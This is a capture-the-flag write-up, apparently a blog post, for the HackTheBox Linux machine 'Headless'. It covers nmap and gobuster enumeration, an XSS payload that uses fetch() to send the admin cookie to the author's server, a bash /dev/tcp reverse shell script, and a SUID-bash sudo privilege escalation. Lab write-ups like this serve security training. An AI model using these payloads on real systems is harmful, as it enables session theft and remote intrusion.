---
layout: post
title: Headless
categories:
- HackTheBox
- Machines
tags:
- hackthebox
- machines
- xss
- linux
- privilege escalation
- burp suite
date: 2024-04-05 20:46 +0300
---
# Introduction
Welcome to another HTB writeup. In this session, we'll delve into Headless, a Linux-based machine. The key learning objectives of exploiting this machine include:

- Cross-Site Scripting (XSS)
- Privilege Escalation leveraging SUDO

Without delay, let's proceed with our exploration.

# Stage 1: Scanning and Enumeration
## Nmap Scan

Conducting an nmap scan (nmap -sC -sV **IP Address**) to identify open ports, yielding the subsequent output:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 12:35 EAT
Nmap scan report for 10.10.11.8
Host is up (0.71s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 24 Mar 2024 09:38:46 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=3/24%Time=65FFF4A7%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Sun,\x2024\x20Mar\x202024\x2009:38:46\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Z
SF:fs;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\
SF:x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\
SF:x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Construct
SF:ion</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\
SF:x20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20di
SF:splay:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justif
SF:y-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:align-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x20
SF:0,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYP
SF:E\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x
SF:20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20resp
SF:onse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20vers
SF:ion\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x
SF:20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 338.81 seconds
```

Upon inspection, it is noted that there is a default SSH port open alongside a Python web server operational on port 5000. Analysis of the homepage reveals a hint indicating potential manipulation of the "is_admin" cookie value.

![Alt Text](/assets/HTB/Headless/is_admin_cookie(1).png)

## Web Directory Enumeration

```
Running GoBuster presents us with the following result:
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 500) [Size: 265]
/support              (Status: 200) [Size: 2363]

===============================================================
Finished
===============================================================
```

:bulb: **NB:** The cause for displaying status 500 (Internal Server Error) for "/dashboard" is attributed to an oversight during the GoBuster operation, where the "is_admin" cookie was not specified. Typically, the status should reflect 401 (Unauthorized) unless the cookie is utilized.

Upon examining "/dashboard," the following content is observed:
![Alt Text](/assets/HTB/Headless/Unauthorized(2).png)

This confirms the necessity of altering the value of "is_admin" to gain access to this section of the page.

Upon examining "/support," the following content is observed:
![Alt Text](/assets/HTB/Headless/Support_page(3).png)

To conduct a XSS test, intercept the request, modify it, and then proceed to forward the request, following the outlined procedure:
![Alt Text](/assets/HTB/Headless/Intercept_request(4).png)

Subsequent to forwarding the request, the webpage responds as depicted below:
![Alt Text](/assets/HTB/Headless/hacking_attempt_detected(5).png)

This unequivocally verifies the presence of an XSS vulnerability on the web server.

# Stage 2: Exploitation

Following research on various methods of exploiting XSS, an attempt was made to acquire a cookie from the web server by deploying an XSS payload that establishes a connection to a personal server.

![Alt Text](/assets/HTB/Headless/own_server(6).png)

XSS Payload: 
```
<img src=x onerror=fetch('http://**IP Address**:8000/'+document.cookie);>
```

![Alt Text](/assets/HTB/Headless/burpsuite_xss_payload(7).png)

Another cookie has been successfully obtained.

![Alt Text](/assets/HTB/Headless/connected_to_own_server(8).png)

By substituting the value of "is_admin" with the newly acquired value and attempting to access the dashboard page, the following is observed:

![Alt Text](/assets/HTB/Headless/admin_dashboard(9).png)

Given the success of having the web server connect to my server, the next step is to attempt fetching and executing a script from the same server, such as a reverse shell.

The script:
```
#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/**IP Address**/**Port** 0>&1'
```
![Alt Text](/assets/HTB/Headless/burpsuite_revshell(10).png)

A reverse shell has been successfully initiated!

![Alt Text](/assets/HTB/Headless/revshell(11).png)

Acquire the first flag.
![Alt Text](/assets/HTB/Headless/userflag(12).png)

# Stage 3: Privilege Escalation

Obtain the second flag by exploiting SUDO.

![Alt Text](/assets/HTB/Headless/sudo_l(13).png)

Open the file using the `cat` command.

![Alt Text](/assets/HTB/Headless/opening_syscheck(14).png)

Since it's possible that initdb.sh has been deleted, the next step involves recreating the file. Following that, adjust the permissions for /bin/bash to allow execution with the owner's permissions rather than those of "dvir." Finally, execute syscheck using sudo privileges.

![Alt Text](/assets/HTB/Headless/create_initdb_file(15).png)

![Alt Text](/assets/HTB/Headless/escalated_privs(16).png)

Executing /bin/bash -p launches the bash shell with elevated privileges by utilizing the -p option, which sets the effective user ID (EUID) to the real user ID (RUID). This grants the user running the command permissions equivalent to the file's owner, typically root.

Obtain the flag from the root directory.
![Alt Text](/assets/HTB/Headless/root_flag(17).png)